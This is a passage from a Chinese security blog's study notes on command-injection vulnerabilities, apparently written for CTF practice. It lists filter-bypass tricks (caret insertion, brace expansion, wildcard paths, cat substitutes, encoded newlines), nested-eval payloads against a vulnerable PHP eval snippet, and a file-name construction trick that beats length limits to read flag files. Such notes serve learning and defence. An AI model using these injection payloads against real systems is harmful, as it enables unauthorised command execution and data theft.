title="幂符号^"></a>幂符号^</h2><p>这种方法只是用于win的cmd下，用法和引号类似，也是加在命令字符之间不会影响命令的执行，但我测试发现在两个字符之间只能插入一个<code>^</code>，不然执行命令会报错</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">d</span><span class="hljs-symbol">^i</span><span class="hljs-symbol">^r</span><br></code></pre></td></tr></table></figure><h2 id="花括号"><a href="#花括号" class="headerlink" title="花括号{}"></a>花括号{}</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&#123;<span class="hljs-built_in">cat</span>,./flag&#125;<br></code></pre></td></tr></table></figure><h2 id="cat绕过"><a href="#cat绕过" class="headerlink" title="cat绕过"></a>cat绕过</h2><p>读取文件的命令cat被禁时，有很多同替的命令</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">more:</span>一页一页的显示档案内容<br><span class="hljs-symbol">less:</span>与 more 类似，但是比 more 更好的是，他可以[pg dn][pg up]翻页<br><span class="hljs-symbol">head:</span>查看头几行<br><span class="hljs-symbol">tac:</span>从最后一行开始显示，可以看出 tac 是 cat 的反向显示<br><span class="hljs-symbol">tail:</span>查看尾几行<br>nl：显示的时候，顺便输出行号<br><span class="hljs-symbol">od:</span>以二进制的方式读取档案内容，不加选项默认输出八进制<br><span class="hljs-symbol">vi:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">vim:</span>一种编辑器，这个也可以查看<br><span class="hljs-symbol">sort:</span>可以查看<br><span class="hljs-symbol">uniq:</span>可以查看<br>file -f:报错出具体内容<br></code></pre></td></tr></table></figure><p>上边的命令执行后，都可以在输出结果中看到flag</p><p>而od命令可通过添加<code>-c</code>选项输出字符串内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">od</span> -c flag.php<br></code></pre></td></tr></table></figure><h2 id="通配符绕过"><a href="#通配符绕过" class="headerlink" title="通配符绕过"></a>通配符绕过</h2><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">cat *<br>cat f*<br><span class="hljs-regexp">/???/</span><span class="hljs-string">?a</span>t flag.php <span class="hljs-comment">#/bin/cat flag.php</span><br>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?a</span>t <span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><span class="hljs-string">??</span><br>/<span class="hljs-string">??</span><span class="hljs-string">?/</span><span class="hljs-string">?[</span>a][t] <span class="hljs-string">?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">/???/?[a]&#x27;</span><span class="hljs-string">&#x27;[t] ?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;?&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">/???/[:lower:]s #ls</span><br><span class="hljs-string">等等。。。</span><br></code></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<span class="hljs-comment">(\\n)</span>，<span class="hljs-meta">%</span><span class="hljs-number">0</span>d<span class="hljs-comment">(\\r)</span>，<span class="hljs-meta">%</span><span class="hljs-number">09</span><span class="hljs-comment">(\\t)</span>等也可以绕过一些过滤<br></code></pre></td></tr></table></figure><h2 id="命令长度限制绕过"><a href="#命令长度限制绕过" class="headerlink" title="命令长度限制绕过"></a>命令长度限制绕过</h2><p>比如服务器代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$p</span>) &lt; <span class="hljs-number">17</span>)&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>);<br>    &#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><h3 id="嵌套eval"><a href="#嵌套eval" class="headerlink" title="嵌套eval"></a>嵌套eval</h3><p>payload如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://127.0.0.1/x.php?p=eval($_GET</span>[<span class="hljs-string">x</span>])&amp;x=echo <span class="hljs-code">`cat /flag`</span>;<br></code></pre></td></tr></table></figure><h3 id="文件构造绕过"><a href="#文件构造绕过" class="headerlink" title="文件构造绕过"></a>文件构造绕过</h3><p>通常利用<code>ls -t</code>、<code>&gt;</code>、<code>&gt;&gt;</code>和<code>换行符\</code>绕过长度限制</p><blockquote><p>使用ls -t命令，可以将文件名按照时间顺序排列出来(后创建的排在前面)<br>使用&gt;，可以将命令结果存入文件中<br>使用&gt;&gt;，可以将字符串添加到文件内容末尾，不会覆盖原内容<br>使用换行符\，可以将一条命令写在多行</p></blockquote><p>组合起来原理如下：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">linux下可以用 1&gt;a创建文件名为a的空文件<br><span class="hljs-keyword">ls</span> -t&gt;<span class="hljs-keyword">test</span>则会将目录按时间排序后写进<span class="hljs-keyword">test</span>文件中<br><span class="hljs-keyword">sh</span>命令可以从一个文件中读取命令来执行<br></code></pre></td></tr></table></figure><ol><li>先创建文件名可以连接成要执行命令的空文件(由于ls -t命令，所以要倒序创建文件)</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ping |<span class="hljs-built_in">mkdir</span> aaa <span class="hljs-comment">#建一个空目录aaa创建文件，防止和web页面混在一起干扰命令的构造</span><br>ping |&gt;aaa/php<br>ping |&gt;aaa/ag.\\<br>ping |&gt;aaa/fl\\<br>ping |&gt;aaa/t\ \\ <span class="hljs-comment">#注意cat后面有一个空格，需要一个反斜杠做转义！不然会被截断</span><br>ping |&gt;aaa/ca\\<br></code></pre></td></tr></table></figure><p><img src="/image-20220522205457037.png" srcset="/img/loading.gif" lazyload alt="image-20220522205457037"></p><p>注意这里使用两个反斜杠是因为，前面说到了在命令后面加上一个反斜杠可以将一条命令写在多行，而第一个反斜杠就是为了转义这个反斜杠，从而让文件名中存在一个反斜杠</p><ol start="2"><li>执行<code>ls -t aaa&gt;cmd</code>，将目录下的文件名按时间排序后写进cmd文件中，如果创建空文件时，创建了点.开头的文件，上边命令要添加-a选项将隐藏文件也写入cmd，即<code>ls -at aaa&gt;cmd</code></li></ol><p><img src="/image-20220522205636103.png" srcset="/img/loading.gif" lazyload alt="image-20220522205636103"></p><p>可以查看cmd文件的内容如下，组合起来就是<code>cat flag.php</code></p><p><img src="/image-20220522205710835.png" srcset="/img/loading.gif" lazyload alt="image-20220522205710835"></p><ol start="3"><li>执行<code>sh cmd</code>命令，从cmd文件中读取命令来执行</li></ol><p><img src="/image-20220522210201953.png" srcset="/img/loading.gif" lazyload alt="image-20220522210201953"></p><h2 id="内联命令绕过关键词"><a href="#内联命令绕过关键词" class="headerlink" title="内联命令绕过关键词"></a>内联命令绕过关键词</h2><p>可以使用反引号ls的输出作为cat的输入来绕过文件关键词，比如当前目录下有一个flag，但<code>flag</code>这个关键词被禁用了，就在可以这样绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> `<span class="hljs-built_in">ls</span>`<br></code></pre></td></tr></table></figure><h1 id="审计技巧"><a href="#审计技巧" class="headerlink" title="审计技巧"></a>审计技巧</h1><p>待填坑…</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://houkc.github.io/2020/12/02/commandExecute/">Web笔记（九）命令执行漏洞</a></p><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241808">浅谈命令执行的绕过方法</a></p><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10947">浅析命令执行</a></p></div><hr><div><div class="post-metas my-3"><div class="post-meta mr-3 d-flex align-items-center"><i class="iconfont icon-category"></i> <span class="category-chains"><span class="category-chain"><a href="/categories/%E6%8A%80%E6%9C%AF/" class="category-chain-item">技术</a> <span>></span> <a href="/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="category-chain-item">网络安全</a></span></span></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="print-no-link">#命令执行</a></div></div><div class="license-box my-3"><div class="license-title"><div>命令执行漏洞学习笔记</div><div>https://wanf3ng.github.io/2022/05/18/命令执行漏洞学习笔记/</div></div><div class="license-meta"><div class="license-meta-item"><div>作者</div><div>wanf3ng</div></div><div class="license-meta-item license-meta-date"><div>发布于</div><div>2022年5月18日</div></div><div class="license-meta-item"><div>许可协议</div><div><a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/"><span class="hint--top hint--rounded" aria-label="BY - 署名"><i class="iconfont icon-by"></i></span></a></div></div></div><div class="license-icon iconfont"></div></div><div class="post-prevnext my-3"><article class="post-prev col-6"><a href="/2022/05/24/%E7%BC%96%E7%A8%8B%E6%84%9F%E6%83%B3/" title="编程感想"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">编程感想</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/2022/05/18/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="php文件包含学习笔记"><span class="hidden-mobile">php文件包含学习笔记</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article id="comments" lazyload><div id="valine"></div><script type="text/javascript">Fluid.utils.loadComments("#valine",(function(){Fluid.utils.createScript("https://lib.baomitu.com/valine/1.5.1/Valine.min.js",(function(){var i=Object.assign({appId:"p02g21Pc8PhKfLm9ib0EkgvU-gzGzoHsz",appKey:"WvjDJdcuEIzre37U5HgmMBRy",path:"window.location.pathname",placeholder:"说点什么",avatar:"retro",meta:["nick","mail","link"],requiredFields:[],pageSize:10,lang:"zh-CN",highlight:!0,recordIP:!0,serverURLs:"",emojiCDN:null,emojiMaps:null,enableQQ:!0},{el:"#valine",path:window.location.pathname});new Valine(i),Fluid.utils.waitElementVisible("#valine .vcontent",()=>{var i="#valine .vcontent img:not(.vemoji)";Fluid.plugins.imageCaption(i),Fluid.plugins.fancyBox(i)})}))}))</script><noscript>Please enable JavaScript to view the comments</noscript></article></article></div></div></div><div class="side-col d-none d-lg-block col-lg-2"><aside class="sidebar" style="margin-left:-1rem"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i> <span>目录</span></p><div class="toc-body" id="toc-body"></div></div></aside></div></div></div><a id="scroll-top-button" aria-label="TOP" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer><div class="footer-inner"><div class="footer-content"><a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a><div style="font-size:.85rem"><span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span><script src="/js/duration.js"></script></div></div><div class="statistics"><span id="busuanzi_container_site_pv" style="display:none">总访问量 <span id="busuanzi_value_site_pv"></span> 次 </span><span id="busuanzi_container_site_uv" style="display:none">总访客数 <span id="busuanzi_value_site_uv"></span> 人</span></div></div></footer><script src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:100}),NProgress.start(),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js"></script><script src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js"></script><script>!function(t,e){var i=Fluid.plugins.typing,n=e.getElementById("subtitle");n&&i&&i(n.getAttribute("data-typed-text"))}(window,document)</script><script src="/js/img-lazyload.js"></script><script>Fluid.utils.createScript("https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js",(function(){var t=jQuery("#toc");if(0!==t.length&&window.tocbot){var i=jQuery("#board-ctn").offset().top;window.tocbot.init(Object.assign({tocSelector:"#toc-body",contentSelector:".markdown-body",linkClass:"tocbot-link",activeLinkClass:"tocbot-active-link",listClass:"tocbot-list",isCollapsedClass:"tocbot-is-collapsed",collapsibleClass:"tocbot-is-collapsible",scrollSmooth:!0,includeTitleTags:!0,headingsOffset:-i},CONFIG.toc)),t.find(".toc-list-item").length>0&&t.css("visibility","visible"),Fluid.events.registerRefreshCallback((function(){if("tocbot"in window){tocbot.refresh();var t=jQuery("#toc");if(0===t.length||!tocbot)return;t.find(".toc-list-item").length>0&&t.css("visibility","visible")}}))}}))</script><script src="https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js"></script><script>Fluid.plugins.codeWidget()</script><script>Fluid.utils.createScript("https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js",(function(){window.anchors.options={placement:CONFIG.anchorjs.placement,visible:CONFIG.anchorjs.visible},CONFIG.anchorjs.icon&&(window.anchors.options.icon=CONFIG.anchorjs.icon);var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(window.anchors.options.class="anchorjs-link-left"),window.anchors.add(o.join(", ")),Fluid.events.registerRefreshCallback((function(){if("anchors"in window){anchors.removeAll();var n=(CONFIG.anchorjs.element||"h1,h2,h3,h4,h5,h6").split(","),o=[];for(var s of n)o.push(".markdown-body > "+s.trim());"left"===CONFIG.anchorjs.placement&&(anchors.options.class="anchorjs-link-left"),anchors.add(o.join(", "))}}))}))</script><script>Fluid.utils.createScript("https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js",(function(){Fluid.plugins.fancyBox()}))</script><script>Fluid.plugins.imageCaption()</script><script src="/js/local-search.js"></script><script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="/js/custom.js"></script><script src="/js/boot.js"></script><noscript><div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div></noscript></body></html>